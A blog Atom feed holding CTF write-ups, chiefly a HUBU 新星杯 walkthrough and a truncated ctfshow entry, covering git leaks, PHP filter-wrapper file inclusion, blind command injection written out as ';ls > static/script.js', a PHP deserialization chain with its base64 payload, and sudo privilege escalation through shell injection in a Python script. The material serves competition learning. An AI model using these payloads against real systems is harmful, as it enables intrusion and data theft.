<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>梦~醒🥝</title>
  
  
  <link href="https://m3x1.cn/atom.xml" rel="self"/>
  
  <link href="https://m3x1.cn/"/>
  <updated>2024-12-07T10:48:39.922Z</updated>
  <id>https://m3x1.cn/</id>
  
  <author>
    <name>梦~醒🥝</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HUBU新星杯wp</title>
    <link href="https://m3x1.cn/posts/3c1876bb.html"/>
    <id>https://m3x1.cn/posts/3c1876bb.html</id>
    <published>2024-12-07T10:42:46.432Z</published>
    <updated>2024-12-07T10:48:39.922Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1>HUBU新星杯wp</h1><h2 id="web">web</h2><h4 id="Robots-Leak">Robots Leak</h4><blockquote><p>考点：git泄露</p></blockquote><blockquote><p>开启题目</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130175850152.png" alt="image-20241130175850152"></p><blockquote><p>先扫目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180035365.png" alt="image-20241130180035365"></p><blockquote><p>git泄露，直接拉取git到本地，然后有个.git文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180200728.png" alt="image-20241130180200728"></p><blockquote><p>进入到文件里，查看日志</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180256138.png" alt="image-20241130180256138"></p><blockquote><p>找到关键词flag，查看一下内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180337316.png" alt="image-20241130180337316"></p><blockquote><p>拿到一半flag。</p><p>查看一下其他日志内容，都没什么营养，然后看看有没有文件，用git stash pop</p><p>发现拉取了一个.flag.exe，查看得到下一半</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180607763.png" alt="image-20241130180607763"></p><blockquote><p>合起来就是全部flag</p></blockquote><blockquote><p>HUBUCTF{431332b1-e91f-4437-9036-b9059539886f}</p></blockquote><h4 id="ez-http">ez-http</h4><blockquote><p>考点：http基础</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180913089.png" alt="image-20241130180913089"></p><blockquote><p>http基础，按要求一步一步来，建议抓包放进重放器里面，方便</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181057278.png" alt="image-20241130181057278"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181134970.png" alt="image-20241130181134970"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181201614.png" alt="image-20241130181201614"></p><blockquote><p>剩下的就是改referrer，添加一个ip(网上搜一下，多试)，然后改cookie等等。（不截图了）</p></blockquote><h4 id="Random-Door">Random_Door</h4><blockquote><p>考点：python脚本，php伪协议</p></blockquote><blockquote><p>打开网站</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215117246.png" alt="image-20241130215117246"></p><blockquote><p>嗯，好，满天星，写个脚本挨着读</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">base_url = &quot;http://challenge.hubuctf.cn:30423/flag&quot;</span><br><span class="line">delay = 1  # 延迟1秒</span><br><span class="line"></span><br><span class="line">for i in range(1, 101):</span><br><span class="line">    url = f&quot;&#123;base_url&#125;&#123;i&#125;.php&quot;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        </span><br><span class="line">        if response.status_code == 200:</span><br><span class="line">            print(f&quot;Success: &#123;url&#125;&quot;)</span><br><span class="line">            print(response.text)</span><br><span class="line">            print(&quot;-&quot; * 40)</span><br><span class="line">    except requests.RequestException as e:</span><br><span class="line">        print(f&quot;Failed to access &#123;url&#125;: &#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 延迟1秒</span><br><span class="line">    time.sleep(delay)</span><br><span class="line"></span><br><span class="line">print(&quot;All requests completed.&quot;)</span><br></pre></td></tr></table></figure><blockquote><p>最后发现只有两个能打开。</p></blockquote><blockquote><p>先看第一个，在flag42.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215346661.png" alt="image-20241130215346661"></p><blockquote><p>这是个提示信息，提示可能要传参file</p></blockquote><blockquote><p>再看第二个flag79.php</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130215427479.png" alt="image-20241130215427479"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (preg_match(&#x27;/base64|http/&#x27;, $_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    die(&#x27;base64 | http is not allowed&#x27;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;flag in flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><blockquote><p>传file，直接filter伪协议读取，然后你就会发现。。。。</p></blockquote><blockquote><p>flag.php是空哒！哈哈哈哈哈！！！！！！</p></blockquote><blockquote><p>我只能说真会玩，第一个网页才是真的后门入口，在第一个网页进行filter读取拿到flag。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9ICJIVUJVQ1RGezUwMGE0MzEyLTM2ZTItNDlkZi05MjRlLTkyY2EzYWM0MDMwN30iIDs/Pgo=</span><br></pre></td></tr></table></figure><blockquote><p>解码得到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HUBUCTF&#123;500a4312-36e2-49df-924e-92ca3ac40307&#125;</span><br></pre></td></tr></table></figure><h4 id="RCE-Level-2">RCE - Level 2</h4><blockquote><p>考点：无回显rce</p></blockquote><blockquote><p>根据提示知道是没有回显的。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181550210.png" alt="image-20241207181550210"></p><blockquote><p>打开界面，发现是个登录框，先用御剑扫一下目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181645879.png" alt="image-20241207181645879"></p><blockquote><p>发现cmd.php，打开发现就是命令执行框</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181722098.png" alt="image-20241207181722098"></p><blockquote><p>先随便ping一个</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181915228.png" alt="image-20241207181915228"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207181942232.png" alt="image-20241207181942232"></p><blockquote><p>发现几乎没啥过滤，但是就是无回显</p><p>无回显做法：</p><p>\1. 将运行结果写入到网站的文件里。</p><p>\2. 写马</p><p>\3. 进行数据外带，如dnslog，curl等都可以</p></blockquote><blockquote><p>经过测试，发现static/script.js是可以写入的（虽然我也不知道怎么测试的，是看的别人的wp）</p><p>在输入框中输入 127.0.0.1;ls &gt; static/script.js ,页面显示<strong>执行成功</strong></p><p>后查看js文件，可以看到执行的结果</p><p>在根目录下找到flag文件 f1ag_1s_h3r3 （ 127.0.0.1;ls / &gt; static/script.js )</p><p>继续读取flag ，执行 127.0.0.1;cat /f1ag_1s_h3r3 &gt; static/script.js</p></blockquote><h4 id="Web-Pentest">Web Pentest *</h4><blockquote><p>考点：APK分析，反序列化</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183244358.png" alt="image-20241207183244358"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183301370.png" alt="image-20241207183301370"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183315132.png" alt="image-20241207183315132"></p><blockquote><p>根据对话信息可以推测，可能在协会官网的源代码里</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183504391.png" alt="image-20241207183504391"></p><blockquote><p><strong>方式一</strong></p><p>逆向手应该都有安卓模拟器，直接apk安装到模拟器上。或者直接安装到手机上。</p><p>启动app就直接有了web后台地址。</p></blockquote><blockquote><p><strong>方式二</strong></p><p>misc 手应该需要会，apk本质也是个压缩包。把apk后缀改成zip然后解压。直接搜flag 但是有一点要注意，app打包之后xml文件是二进制。因此也考察了选手对于grep的使用情况</p><p>/flag1-21daSD21agfgDDDZVFGSVsasd32Ws2asCZCDw.php</p><p>admin:admin</p><p>grep -a -r “flag” .  # 搜索二进制 递归搜索</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207183733181.png" alt="image-20241207183733181"></p><blockquote><p>然后里面就是个简单的反序列化考点</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;FLAG.php&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">public function _ construct($file)</span><br><span class="line">&#123;</span><br><span class="line">$this &gt; file = $file;</span><br><span class="line">&#125;</span><br><span class="line">public function test()</span><br><span class="line">&#123;</span><br><span class="line">system($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match(&#x27;/filter/&#x27;, $this &gt; file)) &#123;</span><br><span class="line">echo $this &gt; file;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">其实这个序列化很简单链子是 APT &gt; K1T0 触发魔术方法 toString</span><br><span class="line">exit();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">public function kkk()</span><br><span class="line">&#123;</span><br><span class="line">eval ($this &gt; test);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">function _ wakeup()</span><br><span class="line">&#123;</span><br><span class="line">echo $this &gt; eth0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">show_source( _ FILE _ );</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$file = base64_decode($_GET[&#x27;file&#x27;]);</span><br><span class="line">unserialize($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0); / 关闭错误报告</span><br><span class="line">class K1T0</span><br><span class="line">&#123;</span><br><span class="line">protected $file = &#x27;php: / filter/read=convert.base64-</span><br><span class="line">encode/resource=/flag&#x27;;</span><br><span class="line">public $test;</span><br><span class="line">function _ toString()</span><br><span class="line">&#123;</span><br><span class="line">if (!empty($this &gt; file)) &#123;</span><br><span class="line">if (!preg_match( &quot;filter&quot;,$this &gt; file)) &#123;</span><br><span class="line">printf(&quot;再试试&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">include($this &gt; file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return &quot;successful guy!!!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class APT</span><br><span class="line">&#123;</span><br><span class="line">public $eth0;</span><br><span class="line">public $eth1;</span><br><span class="line">&#125;</span><br><span class="line">$a=new APT();</span><br><span class="line">$a &gt; eth0=new K1T0();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line">?</span><br><span class="line">file=TzozOiJBUFQiOjI6e3M6NDoiZXRoMCI7Tzo0OiJLMVQwIjoyOntzOjc6IgAqA</span><br><span class="line">GZpbGUiO3M6NTQ6InBocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29</span><br><span class="line">kZS9yZXNvdXJjZT0vZmxhZyI7czo0OiJ0ZXN0IjtOO31zOjQ6ImV0aDEiO047fQ</span><br></pre></td></tr></table></figure><blockquote><p>读取的时候是读取/flag，而不是flag.php，不然是读取不出来的。</p></blockquote><h2 id="misc">misc</h2><h4 id="真假二维码">真假二维码</h4><blockquote><p>考点：文件分离，压缩包密码爆破</p></blockquote><blockquote><p>下载附件，得到一个压缩包，需要密码，根据提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220123688.png" alt="image-20241130220123688"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220230193.png" alt="image-20241130220230193"></p><blockquote><p>解压，有张二维码，扫一下</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220505297.png" alt="image-20241130220505297"></p><blockquote><p>假的flag，binwalk看一下，发现有包含文件，直接foremost提取，得到另一张二维码</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220723797.png" alt="image-20241130220723797"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130220739858.png" alt="image-20241130220739858"></p><blockquote><p>HUBUMARS{751da030-96b5-11ef-89a7-00155d84ef90}</p></blockquote><h4 id="Get-Root-or-Get-Lost">Get Root or Get Lost *</h4><blockquote><p>考点：提权</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173433217.png" alt="image-20241207173433217"></p><blockquote><p>先按照提示连接。</p><p>提权，先试试 sudo -l</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173550048.png" alt="image-20241207173550048"></p><blockquote><p>以sudo命令执行 /opt/game.py ，发现该文件不可读</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207173930648.png" alt="image-20241207173930648"></p><blockquote><p>但是在hubumars的家目录下有一个备份文件 game.bak</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174004104.png" alt="image-20241207174004104"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import random</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def play_game():</span><br><span class="line">    choices = [&quot;石头&quot;, &quot;剪刀&quot;, &quot;布&quot;]</span><br><span class="line">    print(&quot;欢迎来到猜拳游戏！&quot;)</span><br><span class="line">    print(&quot;输入你的选择：&quot;)</span><br><span class="line">    print(&quot;1. 石头&quot;)</span><br><span class="line">    print(&quot;2. 剪刀&quot;)</span><br><span class="line">    print(&quot;3. 布&quot;)</span><br><span class="line">    print(&quot;输入 0 退出游戏&quot;)</span><br><span class="line"></span><br><span class="line">    player = input(&quot;请输入你的名字：&quot;)</span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            # global user_choice</span><br><span class="line">            user_choice = int(input(&quot;你的选择：&quot;))</span><br><span class="line">            if user_choice == 0:</span><br><span class="line">                print(&quot;游戏结束！&quot;)</span><br><span class="line">                break</span><br><span class="line">            if user_choice not in [1, 2, 3]:</span><br><span class="line">                print(&quot;无效输入，请选择 1, 2, 3 或 0 退出游戏。&quot;)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            user_move = choices[user_choice - 1]</span><br><span class="line">            computer_move = random.choice(choices)</span><br><span class="line"></span><br><span class="line">            print(f&quot;你选择了：&#123;user_move&#125;&quot;)</span><br><span class="line">            print(f&quot;电脑选择了：&#123;computer_move&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            if user_move == computer_move:</span><br><span class="line">                print(&quot;平局！&quot;)</span><br><span class="line">            elif (</span><br><span class="line">                (user_move == &quot;石头&quot; and computer_move == &quot;剪刀&quot;)</span><br><span class="line">                or (user_move == &quot;剪刀&quot; and computer_move == &quot;布&quot;)</span><br><span class="line">                or (user_move == &quot;布&quot; and computer_move == &quot;石头&quot;)</span><br><span class="line">            ):</span><br><span class="line">                print(&quot;你赢了！载入史册&quot;)</span><br><span class="line">                winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br><span class="line"></span><br><span class="line">            else:</span><br><span class="line">                print(&quot;你输了！&quot;)</span><br><span class="line"></span><br><span class="line">        except ValueError:</span><br><span class="line">            print(&quot;无效输入，请输入数字。&quot;)</span><br><span class="line">            user_choice = &quot;无效输入&quot;</span><br><span class="line">            message = &quot;echo 警报警报，检测%s 恶意输入 %s &gt;&gt; warning.txt &quot; % (</span><br><span class="line">                player,</span><br><span class="line">                user_choice,</span><br><span class="line">            )</span><br><span class="line">            print(message)</span><br><span class="line">            with open(&quot;warning.txt&quot;, &quot;a&quot;) as file:</span><br><span class="line">                process = subprocess.Popen(</span><br><span class="line">                    [&quot;echo&quot;, message], stdout=file  # 将标准输出重定向到文件</span><br><span class="line">                )</span><br><span class="line">                process.communicate()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    play_game()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>分析看到这段代码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winner = (</span><br><span class="line">                    &quot;echo 用户 【%s】 你战胜利计算机！载入史册 &gt;&gt; shice.txt &quot; % player</span><br><span class="line">                )</span><br><span class="line">                subprocess.Popen(winner, shell=True)</span><br></pre></td></tr></table></figure><blockquote><p>发现会执行winner里面的命令，所以只要将用户名设置成可执行函数，就可以执行。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207174332055.png" alt="image-20241207174332055"></p><blockquote><p>如上图，whoami被执行了，所以我们这次执行找flag.php的命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;find / -name &quot;*flag*&quot; 2&gt;/dev/null;</span><br></pre></td></tr></table></figure><blockquote><p>然后读取root目录下的flag即可</p></blockquote><h4 id="隐秘的流量">隐秘的流量</h4><blockquote><p>考点：流量分析，ICMP协议</p></blockquote><blockquote><p>用wireshake打开，统计-&gt; 分级协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175808812.png" alt="image-20241207175808812"></p><blockquote><p>发现有UDP,TCP,ICMP协议</p><p>重点关注ICMP协议。</p><p>WireShark 过滤条件 icmp &amp; icmp.type = 8 【含义：icmp协议，类型8代</p><p>表发送请求，参考：ICMP报文的格式和种类-腾讯云开发者社区-腾讯云)</p><p>注意到后面都有几个特殊的字符，提取出来</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241207175917648.png" alt="image-20241207175917648"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 使用tshark 提取</span><br><span class="line">└─🍀 tshark -r secret.pcapng -Y &#x27;icmp &amp;&amp; icmp.type = 8&#x27; -T fields -e &quot;data.data&quot; | xxd -p -r | base32 -d | base64 -d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令解释：</span><br><span class="line">-r : 读取文件，后面跟流量包文件名</span><br><span class="line">-Y : 过滤的条件，这里是icmp的方法请求的流量包</span><br><span class="line">-T :设置输出格式，如json，fields等</span><br><span class="line">-e : 输出特定的字段</span><br><span class="line">xxd -p -r ：将十六进制转化为字符串</span><br><span class="line"></span><br><span class="line">windows如果安装了wireshake，则在其目录下有个tshark.exe程序。</span><br></pre></td></tr></table></figure><blockquote><p>HUBUMARS{1CMp_da7a_15_1n73R3571N9}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧HUBU新星杯wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow刷题</title>
    <link href="https://m3x1.cn/posts/7acd7e04.html"/>
    <id>https://m3x1.cn/posts/7acd7e04.html</id>
    <published>2024-12-01T14:09:31.082Z</published>
    <updated>2024-12-01T16:06:22.802Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p>来源：ctfshow</p><h4 id="easyPytHon-P">easyPytHon_P</h4><blockquote><p>考点：代码审计，源代码查看</p></blockquote><blockquote><p>打开后查看源码，发现一个源码地址，打开看看</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150901508.png" alt="image-20241109150901508"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150915342.png" alt="image-20241109150915342"></p><blockquote><p>可以知道在此目录下有个flag.txt文件，再观察源码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import request</span><br><span class="line">cmd: str = request.form.get(&#x27;cmd&#x27;)</span><br><span class="line">param: str = request.form.get(&#x27;param&#x27;)</span><br><span class="line"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span><br><span class="line">import subprocess, os</span><br><span class="line">if cmd is not None and param is not None:</span><br><span class="line">    try:</span><br><span class="line">        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)</span><br><span class="line">        print(&#x27;Done!&#x27;)</span><br><span class="line">    except subprocess.TimeoutExpired:</span><br><span class="line">        print(&#x27;Timeout!&#x27;)</span><br><span class="line">    except:</span><br><span class="line">        print(&#x27;Error!&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;No Flag!&#x27;)</span><br></pre></td></tr></table></figure><blockquote><p>发现传入两个参数cmd和param，会截取cmd的前三个字符当成命令run，param被当成参数。</p><p>所以直接构造cat flag.txt</p><p>payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=cat&amp;param=flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109150800375.png" alt="image-20241109150800375"></p><blockquote><p>ctfshow{7d9cfcf5-9314-4eb0-9240-d77a6ca6f29d}</p></blockquote><h4 id="遍地飘零">遍地飘零</h4><blockquote><p>考点：$$值覆盖，$_GET全局变量和本地变量</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;好多零&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;没有零，仔细看看输入有什么问题吧&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分析代码可知，get传参的参数名会传给key，将key的值传给变量value。</p><p>然后进行变量值覆盖，将key的值当作变量名，将value的值也当作变量名，且赋值前者为后者。</p><p>例如：传递参数 ?get=aa，则$key=get,$value=$key=aa，</p><p>值覆盖时，$$key=$get，$$value=$aa</p><p>所以，目标是执行var_dump($flag)</p><p>构造payload:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_GET=flag</span><br></pre></td></tr></table></figure><blockquote><p>传进去时，$key=_GET,$value=flag，再进行值覆盖，就变成了</p><figure class="highlight 